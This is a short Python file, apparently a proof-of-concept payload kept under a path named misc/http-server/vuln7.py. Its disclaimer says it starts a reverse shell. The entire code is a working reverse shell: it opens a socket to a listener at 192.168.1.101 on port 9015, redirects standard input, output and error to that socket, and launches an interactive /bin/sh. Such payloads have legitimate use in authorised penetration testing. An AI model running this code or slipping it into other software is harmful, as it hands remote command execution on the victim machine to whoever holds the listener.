#misc/http-server/vuln7.py


# Disclaimer:
# This payload starts a reverse shell on the listener
# Usage for the current POC only


import socket
import subprocess
import os

host = "192.168.1.101"
port = 9015

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
subprocess.call(["/bin/sh", "-i"])
